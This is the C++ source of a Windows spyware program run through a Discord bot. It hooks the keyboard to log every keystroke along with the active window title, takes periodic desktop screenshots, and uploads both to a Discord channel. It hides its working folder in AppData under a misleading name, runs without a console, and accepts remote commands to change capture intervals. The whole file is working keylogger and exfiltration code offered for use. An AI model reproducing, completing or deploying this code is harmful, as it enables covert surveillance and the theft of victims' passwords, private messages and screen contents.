#include "MyBot.h"

// #define sh_winapi_success(x) assert(x == S_OK)
// #define winapi_success(x) assert(x != 0)


HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

std::map<std::string, unsigned int> mapper;
unsigned int process_counter = 0;

unsigned long long key_fileindex = 0, image_fileindex = 0;

const WCHAR *LOGGER_FILENAME = L"thislog.txt";
WCHAR local_appdata_path[MAX_PATH+5];
WCHAR bitmap_path[MAX_PATH+5];

std::ofstream logger_file;

std::condition_variable condvar;

ULONG_PTR GDIPLUS_TOKEN;

std::string version_string;

template <typename T>
constexpr T OURMIN(const T& a, const T& b) {
	return a < b ? a : b;
}

//won't create any local files except the running log. Use list for better
//optimization in concurrent element accessing and removing elements.
std::list<std::string> file_list;

//Store previous hash value when hashing/comparing captured image 
std::vector<long long> linehash;

std::unique_ptr<dpp::cluster> bot;
dpp::message keymsg, imagemsg, logmsg;

inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
}

inline void mb_to_wide_char(char* input, WCHAR* output, int outputbuf) {
	MultiByteToWideChar(CP_UTF8, 0, input, -1, output, outputbuf);
}

/// @brief Log to file.  Maximum 1000 characters
/// @param format formatted string, just like printf
/// @param
inline void logger(const char* format, ...) {
	char __buf[1007];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	// vsprintf(__buf, format, arg);
	va_end(arg);

	size_t themin = (strlen(__buf));

	logger_file.write(__buf, OURMIN(themin, (size_t)1000));
	logger_file.flush();

    // std::string str(__buf);
    // logmsg.set_content(str);
    // bot->message_create(logmsg, [](const dpp::confirmation_callback_t& loghandle) {
	// 	exit(-1);   //fatal, must stop, or restart
    // });

}

/// @brief Print to container.
/// @param format formatted string, just like printf
/// @param
inline void print_to(const char* format, ...) {
    char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	if(file_list.back().size() >= 7000000) [[unlikely]] {
		file_list.push_back(std::string());
	}
	file_list.back().append(__buf);
}

/// @brief Marco for "safe error handling", unused
/// @param func [in] Function name
/// @param okval [in] Value need to be return when the function sucessfully called
/// @param last_error_info Varible to pass failed function name for debugging
/// @param err_ret_expr [in] Expression to call when to function fail. Can be anything in caller's function code
                            ///Multiline code should be wrapped in curly bracket.
/// @param ... the argument pass to function specified by func
#define SCALL(func, okval, last_error_info, err_ret_expr,...) if(func(__VA_ARGS__) != okval) { \
                                                last_error_info = #func; \
                                                err_ret_expr; \
                                                }


/*Return -1 if fail, non-negative if success*/
int MakeBitmapStruct::GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	// Gdiplus::Status callStatus;
	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	// SCALL(Gdiplus::GetImageEncodersSize, Gdiplus::Ok, err_string, {}, &num, &size);
	Gdiplus::GetImageEncodersSize(&num, &size);
	if(size == 0) return -1;  // Failure

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if(pImageCodecInfo == NULL) return -1;  // Failure

	Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

	for(UINT j = 0; j < num; ++j) {
		if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}    
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}

long long MakeBitmapStruct::hash(char *block, int size, long long mod, int base) {
	long long ans = 0;
	long long cbase = base;
	for(int i=0; i < size; i++) {
		ans = ans + ((((long long) block[i] + 129)*cbase) % mod);
		ans %= mod;
		cbase = (cbase * base) % mod;
	}
	return ans;
}

MakeBitmapStruct::MakeBitmapStruct(long long thashmod, int thashbase) {
	hashmod = thashmod;
	hashbase = thashbase;
}

MakeBitmapStruct::~MakeBitmapStruct() {
	if(freelim >= 1) ReleaseDC(NULL, hDC);
	if(freelim >= 2) DeleteDC(hMemDC);
	if(freelim >= 3) DeleteObject(hBitmap);
	if(freelim >= 4) free(memblock);
	if(freelim >= 5) free(jpg_stat);
	if(freelim >= 6) rawbitmap_stream->Release();
	if(freelim >= 7) jpg_stream->Release();
}


/// @brief Capture screenshot
/// @param allocatedJPG [out] Pointer to the pointer contain allocated memory. Caller clean-up
/// @param allocatedsize [out] size of the allocated memory
/// @param hs [in] the factor for the hash check function. Value must be 0 to skip the check 
/// @return 0 is success, 0xFF(255) if the image is considered duplicated 
/// with previous shot; otherwise fail; Buffer must be cleaned up using C function free()
int WINAPI MakeBitmapStruct::MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize, unsigned int hs) {
	freelim = 0;

	BITMAPFILEHEADER bfHeader;
	BITMAPINFOHEADER biHeader;
	BITMAPINFO bInfo;
	HGDIOBJ hTempBitmap;
	BITMAP bAllDesktops;
	LONG width, height;
	BYTE *bBits = NULL;
	DWORD cbBits, dwWritten = 0;
	INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
	INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
	int returncode = 0;

	ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
	ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
	ZeroMemory(&bAllDesktops, sizeof(BITMAP));

	hDC = GetDC(NULL);
	if(hDC == NULL) {
		return 1;
	}
	freelim++;

	hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
	if(hTempBitmap == NULL) {
		return 2;
	}

	if(GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops) == 0) {
		return 3;
	}

	width = bAllDesktops.bmWidth;
	height = bAllDesktops.bmHeight;

	DeleteObject(hTempBitmap);

	bfHeader.bfType = (WORD)('B' | ('M' << 8));
	bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	biHeader.biSize = sizeof(BITMAPINFOHEADER);
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;
	biHeader.biPlanes = 1;
	biHeader.biWidth = width;
	biHeader.biHeight = height;

	bInfo.bmiHeader = biHeader;

	cbBits = (((24 * width + 31)&~31) / 8) * height;

	hMemDC = CreateCompatibleDC(hDC);
	if(hMemDC == NULL) {
		return 4;
	}
	freelim++;

	hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
	if(hBitmap == NULL) {
		return 5;    
	}
	freelim++;

	SelectObject(hMemDC, hBitmap);
	if(BitBlt(hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY) == 0) {
		return 6;
	}

	unsigned int memblocksize = (unsigned int) sizeof(BITMAPFILEHEADER) + (unsigned int) sizeof(BITMAPINFOHEADER) + cbBits;
	memblock = (char*) malloc(memblocksize);
	memcpy(memblock, &bfHeader, sizeof(BITMAPFILEHEADER));
	memcpy(memblock + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
	memcpy(memblock + (sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)), bBits, cbBits);
	freelim++;

    if(hs != 0) {
        //hash check. False detection is very possible. Should only be run when no key is typing 
        std::vector<long long> tlinehash (height*hs);
        int proc = width/hs;
        int proc2 = proc + (width % hs);
        for(int i=0; i < height; i++) {
            for(int j=0; j < hs-1; j++) {
                tlinehash[i*hs+j] = hash(memblock+(width*i+proc*j), proc, hashmod, hashbase);
            }
            tlinehash[i*hs+(hs-1)] = hash(memblock+(width*i+proc*(hs-1)), proc2, hashmod, hashbase);
        }
        if(tlinehash.size() == linehash.size()) {
            int matchcnt = 0;
            for(int i=0; i < tlinehash.size(); i++) {
                if(tlinehash[i] == linehash[i]) matchcnt++;
            }
            float flt = (float) matchcnt / tlinehash.size();
            if(flt > 0.95f) {
                return 0xFF;
            }
        }

        linehash = tlinehash;
    }

	//compress

	CLSID pngClsid;

	LARGE_INTEGER __TEMP_SEEK_OFFSET;
	__TEMP_SEEK_OFFSET.QuadPart = 0;

	jpg_stat = (STATSTG*) malloc(sizeof(STATSTG));
	HRESULT hr;

	freelim++;

	rawbitmap_stream = NULL; 
	hr = CreateStreamOnHGlobal(NULL, TRUE, &rawbitmap_stream);
	if(hr == E_INVALIDARG) {
		return -5;
	} else if(hr == E_OUTOFMEMORY) {
		return -6;
	}
	freelim++;

	jpg_stream = NULL;
	hr = CreateStreamOnHGlobal(NULL, TRUE, &jpg_stream);
	if(hr == E_INVALIDARG) {
		return -7;
	} else if(hr == E_OUTOFMEMORY) {
		return -8;
	}
	freelim++;
	
	if(rawbitmap_stream->Write(memblock, memblocksize, &dwWritten) != S_OK) {
		return -1;
	}   

	Gdiplus::Image image(rawbitmap_stream);

	if(GetEncoderClsid(L"image/jpeg", &pngClsid) == -1) {
		return -2;
	}

	if(image.Save(jpg_stream, &pngClsid, NULL) != Gdiplus::Ok) {
		return -3;
	}

	jpg_stream->Stat(jpg_stat, 1); //specified no name
	*allocatedsize = (unsigned int) jpg_stat->cbSize.QuadPart;
	*allocatedJPG = (char*) malloc(*allocatedsize);

	//seek back to beginning to read
	if(jpg_stream->Seek(__TEMP_SEEK_OFFSET, STREAM_SEEK_SET, NULL) != S_OK) {
		free(allocatedJPG);
		return -3;
	}
	if(jpg_stream->Read(*allocatedJPG, *allocatedsize, &dwWritten) != S_OK) {
		free(allocatedJPG);
		return -4;
	}

	return returncode;
}

std::mutex send_key_mx;

// void send_key(std::string& err) {
void send_key(bool from_schedule = false) {

	send_key_mx.try_lock();
	std::string err = "ok!";	//temp
	bool __is_failed = false;

	//new write location!
	file_list.push_back(std::string());
	while(file_list.size() > 1) {
		
		if(file_list.begin()->size() > 0) {
			//for "safety issue" and since file are 7 mb each so we would send everyfile one by one
			//filename when upload to discord is unnecessary, so let it in order
			keymsg.add_file(std::to_string(key_fileindex).append(".txt"), file_list.front());
			if(from_schedule) keymsg.set_content("Data sent from schedule!");
			else keymsg.set_content("Data sent!");
			bot->message_create(keymsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
				if (eventret.is_error()) {
					err = eventret.get_error().message;
					__is_failed = true;
					return dpp::utility::log_error()(eventret);
				}
			});
			key_fileindex++;
		}
		keymsg.filename.clear();
		keymsg.filecontent.clear();
		// if(__is_failed) return;
		
		file_list.erase(file_list.begin());
	}
	send_key_mx.unlock();
	
}

void send_bitmap() {
	while(true) {
		MakeBitmapStruct mbs;

		std::this_thread::sleep_for(std::chrono::seconds(COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL));	//test

		std::string err = "ok!";	//temp
		bool __is_failed = false;

		char *jpg_buffer = NULL;
		unsigned int jpg_size = 0;
		int status = mbs.MakeBitmap(&jpg_buffer, &jpg_size, COMMAND_LINE_OPTION.DEFAULT_HS);
		
		if(status == 0xFF) {
			free(jpg_buffer);
		} else {
			if(status == 0) {
				imagemsg.set_content("Image sent!");
				imagemsg.add_file(std::to_string(image_fileindex).append(".jpg"), std::string(jpg_buffer, jpg_size));
				free(jpg_buffer);
			} else {
				imagemsg.set_content("Fail to capture image! Error " + std::to_string(status));
			}

			bot->message_create(imagemsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
				if (eventret.is_error()) {
					err = eventret.get_error().message;
					// __is_failed = true;
					return dpp::utility::log_error()(eventret);
				}
			});
			image_fileindex++;
			imagemsg.filename.clear();
			imagemsg.filecontent.clear();
			// if(__is_failed) return;
		}
	}
}

int Save_compressed(int key_stroke) {
	static WCHAR lastwindow[260] = L"";	//must be static or thing will break!
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground) {
		WCHAR window_title[260];
		char mbwindow_title[260];

		GetWindowTextW(foreground, window_title, 256);
		if (wcscmp(window_title, lastwindow) != 0)
		{
			wcscpy(lastwindow, window_title);
			wide_char_to_mb(window_title, mbwindow_title, 260);
			std::string strwindow_title(mbwindow_title);
			time_t timestamp = time(NULL);

			if (mapper[strwindow_title] == 0) {
				if (process_counter >= ~(0U)) {
					assert(false && "Internal error! Map overflowed");
				}
				mapper[strwindow_title] = ++process_counter;
				// logger("\nNew map: %d %s\n", process_counter, mbwindow_title);
				print_to("\n>%u %s\n", process_counter, strwindow_title.c_str());
			}

			unsigned int mapper_id = mapper[strwindow_title];
			// logger("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
			print_to("\n[%u %lld\n", mapper_id, timestamp);
		}
	}

	print_to("%.2x", key_stroke);

	return 0;
}

int Save(int key_stroke) {
	static WCHAR lastwindow[260] = L"";
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		WCHAR window_title[260];
		char mbwindow_title[260], s[64];
		
		if(GetWindowTextW(foreground, window_title, 256) == 0) {
			wcscpy(window_title, L"[[empty windows title]]");
		}

		if (wcscmp(window_title, lastwindow) != 0)
		{
			wcscpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			strftime(s, sizeof(s), "%c", &tm);

			wide_char_to_mb(window_title, mbwindow_title, 260);
			print_to("\n\n[Window: %s - at %s] ", mbwindow_title, s);
		}
	}
	
	if (keyname.find(key_stroke) != keyname.end()) {
		print_to("%s", keyname.at(key_stroke).c_str());
	} else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		print_to("%c", key);
	}
	
	return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbdStruct.vkCode);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

//Search for local appdata, make log file, say hello world before everything start
inline void preinit() {
	// Initialize gdi+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	Gdiplus::GdiplusStartup(&GDIPLUS_TOKEN, &gdiplusStartupInput, NULL);

	// Check and create local directory. Usually the loader would already created this before 
	SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata_path);
	wcscat(local_appdata_path, L"\\i_shell_link_shortcut_backup\\");
    if(!CreateDirectoryW(local_appdata_path, NULL)) {
        if(GetLastError() != ERROR_ALREADY_EXISTS) {
            exit(EXIT_FAILURE);
        }
    }
	SetFileAttributesW(local_appdata_path, FILE_ATTRIBUTE_HIDDEN);

	WCHAR __logfilepath[501];
	wcscpy(__logfilepath, local_appdata_path);
	wcscat(__logfilepath, LOGGER_FILENAME);

	logger_file.open(std::filesystem::path(__logfilepath), std::ios::app);

	if(!logger_file) {
		exit(EXIT_FAILURE);
	}

	//Time for logging
	time_t __t = time(NULL);
	struct tm *__timestruct;
	__timestruct = std::localtime(&__t);
	char __timestr[65];
	__timestr[0] = '\0';
	if(__timestruct != nullptr) [[likely]] {
		strftime(__timestr, sizeof(__timestr), "%c", __timestruct);
	}

    //version string
	char buffer[1001];
	version_string.clear();
	#if defined(__clang__)
		snprintf(buffer, 1001, "Built with clang %d.%d.%d ", __clang_major__, __clang_minor__, __clang_patchlevel__);
        version_string += std::string(buffer);
    #elif defined(__GNUC__)
        snprintf(buffer, 1001, "Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
		version_string += std::string(buffer);
    #elif defined(_MSC_VER)
        snprintf(buffer, 1001, "Built with MSVC %d ", _MSC_FULL_VER);
        version_string += std::string(buffer);
    #else
        snprintf(buffer, 1001, "Built with unknown compiler ");
        version_string += std::string(buffer);
    #endif

    //mingw if present
    #if defined(__MINGW64__)
        snprintf(buffer, 1001, "(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
        version_string += std::string(buffer);
    #elif defined(__MINGW32__)
        snprintf(buffer, 1001, "(MinGW %d.%d) ", __MINGW32_MAJOR_VERSION, __MINGW32_MINOR_VERSION);
        version_string += std::string(buffer);
    #endif

	snprintf(buffer, 1001, "on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, (int) (sizeof(void*) << 3), "null");
	version_string += std::string(buffer);
	// logging
	logger("\nHello world! Current time is %s\n%s", __timestr, version_string.c_str());
}

void logrun(bool is_bot_connected)
{
	if (is_bot_connected) {
		logger("[INFO] Bot successfully initialized. Logging...\n");
	} else {
		logger("[CRITICAL!] Bot failed to initialized. Terminating...\n");
		exit(EXIT_FAILURE);
	}

	_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0);
	if (_hook != NULL) {
		logger("[INFO] Key hook initialized!\n");
	} else {
		logger("[CRITICAL!] Failed to install hook. Terminating...\n");
		exit(EXIT_FAILURE);
	}
	MSG msg;
	while (true) {
		GetMessageW(&msg, NULL, 0, 0);
	}
}

void botrun()
{
	bool is_bot_connected = false;
    try {
        /* Create bot cluster */
        bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(COMMAND_LINE_OPTION.BOT_LOCATION[1],	//token
            dpp::i_default_intents,
            0, 0, 2, true,
            { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
            10, 0));

		/* Configure/redirect log messages to logger file */
		bot->on_log([](const dpp::log_t& loghandle) {
			logger("%s%s\n", DPP_LOGLEVEL_MAP.at(loghandle.severity).c_str(), loghandle.message.c_str());
		});

        /* Handle slash command */
		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
			size_t issuing_user = event.command.get_issuing_user().id;
			std::string issuing_command = event.command.get_command_name();
			char buffer[1001];
			if (issuing_command == "ping") {
				snprintf(buffer, 1000, "Pong! %f ms", bot->rest_ping);
				event.reply(buffer);
			}
			if (issuing_command == "version") {
				snprintf(buffer, 1000, "%s", version_string.c_str());
				event.reply(buffer);
			}
			if (issuing_command == "changehs") {
				COMMAND_LINE_OPTION.DEFAULT_HS = (unsigned int) event.command.get_command_interaction().get_value<int64_t>(0);
				snprintf(buffer, 1000, "Capture check factor changed to %u!", COMMAND_LINE_OPTION.DEFAULT_HS);
				event.reply(buffer);
			}
			if (issuing_command == "keytime") {
				COMMAND_LINE_OPTION.SEND_KEY_INTERVAL = (unsigned int) event.command.get_command_interaction().get_value<int64_t>(0);
				snprintf(buffer, 1000, "Key sending interval changed to %um!", COMMAND_LINE_OPTION.SEND_KEY_INTERVAL);
				event.reply(buffer);
			}
			if (issuing_command == "bitmaptime") {
				COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL = (unsigned int) event.command.get_command_interaction().get_value<int64_t>(0);
				snprintf(buffer, 1000, "Bitmap sending interval changed to %us!", COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL);
				event.reply(buffer);
			}

			size_t testsize = issuing_command.size() + 7;
			char* testptr = new char[testsize];
			memset(testptr, 0, testsize);
			strncpy(testptr, issuing_command.c_str(), testsize);
			logger("[INFO] User %u executed %s\n", (unsigned int) issuing_user, testptr);
			delete[] testptr;
        });

		keymsg = dpp::message(bot.get());
		keymsg.set_guild_id(COMMAND_LINE_OPTION.BOT_LOCATION[2]);
		keymsg.set_channel_id(COMMAND_LINE_OPTION.BOT_LOCATION[3]);

		imagemsg = dpp::message(bot.get());
		imagemsg.set_guild_id(COMMAND_LINE_OPTION.BOT_LOCATION[2]);
		imagemsg.set_channel_id(COMMAND_LINE_OPTION.BOT_LOCATION[3]);
		imagemsg.set_content("Image sent!");

        /* Register slash command here in on_ready */
        bot->on_ready([](const dpp::ready_t& event) {
            /* Wrap command registration in run_once to make sure it doesnt run on every full reconnection */
            if (dpp::run_once<struct register_bot_commands>()) {
				//Clear previous command, then register new one
				// bot->global_commands_get([](const dpp::confirmation_callback_t &eventret) {
				// 	dpp::slashcommand_map slashcmd_mapper = eventret.get<dpp::slashcommand_map>();
				// 	for(auto& pp:slashcmd_mapper) {
				// 		bot->global_command_delete(pp.first);
				// 	}
				// });

                bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
				bot->global_command_create(dpp::slashcommand("changehs", "change image hash factor", bot->me.id)
								.add_option(dpp::command_option(dpp::co_integer, "val", "enter val", true)
												.set_max_value(100ll).set_min_value(0ll)
											));
				bot->global_command_create(dpp::slashcommand("keytime", "change key sending interval", bot->me.id)
								.add_option(dpp::command_option(dpp::co_integer, "val", "time in minutes", true)
												.set_max_value(50ll).set_min_value(1ll)
											));
				bot->global_command_create(dpp::slashcommand("bitmaptime", "change bitmap sending interval", bot->me.id)
								.add_option(dpp::command_option(dpp::co_integer, "val", "time in seconds", true)
												.set_max_value(301ll).set_min_value(5ll)
											));
            }

			keymsg.set_content("Session initialized!");
			bot->message_create(keymsg);
			keymsg.set_content("Data sent!");
        });
    
        /* Start the bot */
        bot->start(true);
		is_bot_connected = 1;
    }
	catch (dpp::exception& e) {
        logger("\n[ERROR] %s\n", e.what());
		logrun(is_bot_connected);	//force call
    }

	std::thread log_thr(logrun, is_bot_connected);
	log_thr.detach();

	std::thread t3(send_bitmap);
	t3.detach();

	time_t tptr = time(NULL);
    tm *ts = localtime(&tptr);
    ts->tm_sec = 0;
    ts->tm_min = 0;
    ts->tm_hour = 0;

    time_t tbase = mktime(ts);
    tptr -= tbase;
    
    std::thread t4([&tptr, &tbase]{
		size_t pos = std::upper_bound(SCHEDULE.begin(), SCHEDULE.end(), tptr)-SCHEDULE.begin();
        for(; pos < SCHEDULE.size(); pos++) {
            std::this_thread::sleep_until(
				std::chrono::time_point
					<std::chrono::system_clock, std::chrono::seconds>(
						std::chrono::seconds(tbase+SCHEDULE[pos])
					)
				);
            send_key(true);
        }
    });
    t4.detach();

	while(true) {
		std::this_thread::sleep_for(std::chrono::minutes(COMMAND_LINE_OPTION.SEND_KEY_INTERVAL));
		send_key();
	}
}

const std::map<std::string, std::function<void(const std::vector<std::string>&)>> ARGUMENT_FUNC_MAP = {
	{"c", [](const std::vector<std::string>& vec) {
		COMMAND_LINE_OPTION.COMPRESSED_MODE = true;
	}}, 
	{"t", [](const std::vector<std::string>& vec) {
		const int intended_size = 4;
		for(int i=1; i < OURMIN(intended_size, (int) vec.size()); i++) {
			COMMAND_LINE_OPTION.BOT_LOCATION[i] = vec[i];
		}
	}}
};

//Command-line interface is untested...
int cmdline_parse(int argc, WCHAR** argv) {	
	for(int i=1; i < argc; i++) {
		int wlen = wcslen(argv[i]);
		if(wlen > 1000000) {	[[unlikely]] //too long!
			return -1;
		}

		int len = wlen*2*sizeof(WCHAR);
		char *str = (char*) malloc(len), *tok = NULL;
		wide_char_to_mb(argv[i], str, len);

		if(len > 0) {
			if(str[0] == '-') {
				std::vector<std::string> vec;
				tok = strtok(str, "-:");
				while(tok != NULL) {
					vec.push_back(std::string(tok));
					tok = strtok(NULL, "-:");
				}

				//simply skip unrecognized arguments
				if(ARGUMENT_FUNC_MAP.find(vec[0]) != ARGUMENT_FUNC_MAP.end()) {
					ARGUMENT_FUNC_MAP.at(vec[0])(vec);
				}
			} 
		}

		free(str);
	}
	return 0;
}

//now switch to windows subsystem, no longer console
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	int argc;
	WCHAR** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	cmdline_parse(argc, argv);

	preinit();

	//initial
	file_list.push_back(std::string());

	//currently program only run we successfully connect to discord... will make delayed connection soon
	std::thread t1(botrun);

	t1.join();

	bot->shutdown();
	logger_file.close();
	Gdiplus::GdiplusShutdown(GDIPLUS_TOKEN);
	return 0;
}
